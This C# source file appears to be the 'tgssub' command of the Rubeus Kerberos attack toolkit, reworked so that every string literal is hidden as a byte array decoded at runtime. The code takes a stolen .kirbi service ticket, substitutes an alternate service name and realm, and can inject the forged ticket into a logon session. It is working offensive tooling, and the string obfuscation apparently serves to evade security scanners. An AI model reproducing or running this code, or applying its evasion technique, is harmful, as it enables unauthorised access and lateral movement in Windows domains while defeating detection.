using System;
using System.Collections.Generic;
using System.IO;
using Rubeus.lib.Interop;


namespace Rubeus.Commands
{
    public class Tgssub : ICommand
    {
        // Helper for decoding obfuscated strings
        private static string S(byte[] b) => System.Text.Encoding.UTF8.GetString(b);

        public static string CommandName => S(new byte[] { 116, 103, 115, 115, 117, 98 });

        public void Execute(Dictionary<string, string> arguments)
        {
            Console.WriteLine(S(new byte[] { 13, 10, 91, 42, 93, 32, 65, 99, 116, 105, 111, 110, 58, 32, 83, 101, 114, 118, 105, 99, 101, 32, 84, 105, 99, 107, 101, 116, 32, 115, 110, 97, 109, 101, 32, 83, 117, 98, 115, 116, 105, 116, 117, 116, 105, 111, 110, 13, 10 }));

            string altservice = S(new byte[] {}); // empty string
            LUID luid = new LUID();
            bool ptt = false;
            string srealm = S(new byte[] {}); // empty string

            if (arguments.ContainsKey(S(new byte[] { 47, 108, 117, 105, 100 })))
            {
                try
                {
                    luid = new LUID(arguments[S(new byte[] { 47, 108, 117, 105, 100 })]);
                }
                catch
                {
                    Console.WriteLine(S(new byte[] { 91, 88, 93, 32, 73, 110, 118, 97, 108, 105, 100, 32, 76, 85, 73, 68, 32, 102, 111, 114, 109, 97, 116, 32, 40 }) + arguments[S(new byte[] { 47, 108, 117, 105, 100 })] + S(new byte[] { 41, 13, 10 }));
                    return;
                }
            }

            if (arguments.ContainsKey(S(new byte[] { 47, 112, 116, 116 })))
            {
                ptt = true;
            }

            if (arguments.ContainsKey(S(new byte[] { 47, 97, 108, 116, 115, 101, 114, 118, 105, 99, 101 })))
            {
                altservice = arguments[S(new byte[] { 47, 97, 108, 116, 115, 101, 114, 118, 105, 99, 101 })];
            }
            else
            {
                Console.WriteLine(S(new byte[] { 13, 10, 91, 88, 93, 32, 65, 110, 32, 47, 97, 108, 116, 115, 101, 114, 118, 105, 99, 101, 58, 83, 78, 65, 77, 69, 32, 111, 114, 32, 47, 97, 108, 116, 115, 101, 114, 118, 105, 99, 101, 58, 83, 78, 65, 77, 69, 47, 104, 111, 115, 116, 32, 110, 101, 101, 100, 115, 32, 116, 111, 32, 98, 101, 32, 115, 117, 112, 112, 108, 105, 101, 100, 33, 13, 10 }));
                return;
            }
            
            if(arguments.ContainsKey(S(new byte[] { 47, 115, 114, 101, 97, 108, 109 })))
            {
                srealm = arguments[S(new byte[] { 47, 115, 114, 101, 97, 108, 109 })];
            }

            if (arguments.ContainsKey(S(new byte[] { 47, 116, 105, 99, 107, 101, 116 })))
            {
                string kirbi64 = arguments[S(new byte[] { 47, 116, 105, 99, 107, 101, 116 })];

                if (Helpers.IsBase64String(kirbi64))
                {
                    byte[] kirbiBytes = Convert.FromBase64String(kirbi64);
                    KRB_CRED kirbi = new KRB_CRED(kirbiBytes);
                    LSA.SubstituteTGSSname(kirbi, altservice, ptt, luid, srealm);
                }
                else if (File.Exists(kirbi64))
                {
                    byte[] kirbiBytes = File.ReadAllBytes(kirbi64);
                    KRB_CRED kirbi = new KRB_CRED(kirbiBytes);
                    LSA.SubstituteTGSSname(kirbi, altservice, ptt, luid, srealm);
                }
                else
                {
                    Console.WriteLine(S(new byte[] { 13, 10, 91, 88, 93, 47, 116, 105, 99, 107, 101, 116, 58, 88, 32, 109, 117, 115, 116, 32, 101, 105, 116, 104, 101, 114, 32, 98, 101, 32, 97, 32, 46, 107, 105, 114, 98, 105, 32, 102, 105, 108, 101, 32, 111, 114, 32, 97, 32, 98, 97, 115, 101, 54, 52, 32, 101, 110, 99, 111, 100, 101, 100, 32, 46, 107, 105, 114, 98, 105, 13, 10 }));
                }
                return;
            }
            else
            {
                Console.WriteLine(S(new byte[] { 13, 10, 91, 88, 93, 32, 65, 32, 47, 116, 105, 99, 107, 101, 116, 58, 88, 32, 110, 101, 101, 100, 115, 32, 116, 111, 32, 98, 101, 32, 115, 117, 112, 112, 108, 105, 101, 100, 33, 13, 10 }));
                return;
            }
        }
    }
}